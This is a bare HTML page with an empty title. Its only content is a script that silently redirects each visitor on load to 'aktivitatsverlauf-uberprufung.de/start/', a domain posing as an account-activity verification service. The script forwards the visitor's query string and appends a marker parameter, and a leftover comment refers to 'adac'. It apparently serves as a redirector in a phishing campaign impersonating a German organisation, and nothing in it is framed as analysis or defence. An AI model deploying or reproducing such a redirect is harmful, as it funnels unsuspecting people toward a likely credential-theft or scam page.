<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title></title>
  <script>
    window.onload = function () {
      const baseUrl = "https://aktivitatsverlauf-uberprufung.de/start/";
      const queryString = window.location.search; // everything after ?
      
      // Build redirect URL
      let redirectUrl = baseUrl + (queryString ? queryString : "");
      
      // Add &adac=1 (or ?adac=1 if no query string at all)
      if (redirectUrl.includes("?")) {
        redirectUrl += "&x=1";
      } else {
        redirectUrl += "?x=1";
      }

      // Redirect
      window.location.href = redirectUrl;
    };
  </script>
